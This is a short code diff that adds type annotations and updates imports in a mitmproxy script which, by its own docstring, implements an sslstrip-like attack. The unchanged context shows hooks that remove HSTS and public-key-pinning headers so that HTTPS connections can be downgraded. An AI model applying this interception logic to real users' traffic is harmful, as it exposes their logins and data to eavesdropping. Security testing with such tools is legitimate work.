@@ -3,13 +3,16 @@ This script implements an sslstrip-like attack based on mitmproxy.
 https://moxie.org/software/sslstrip/
 """
 import re
-import urllib
+import urllib.parse
+import typing  # noqa
+
+from mitmproxy import http
 
 # set of SSL/TLS capable hosts
-secure_hosts = set()
+secure_hosts = set()  # type: typing.Set[str]
 
 
-def request(flow):
+def request(flow: http.HTTPFlow) -> None:
     flow.request.headers.pop('If-Modified-Since', None)
     flow.request.headers.pop('Cache-Control', None)
 
@@ -27,7 +30,7 @@ def request(flow):
         flow.request.host = flow.request.pretty_host
 
 
-def response(flow):
+def response(flow: http.HTTPFlow) -> None:
     flow.response.headers.pop('Strict-Transport-Security', None)
     flow.response.headers.pop('Public-Key-Pins', None)
 
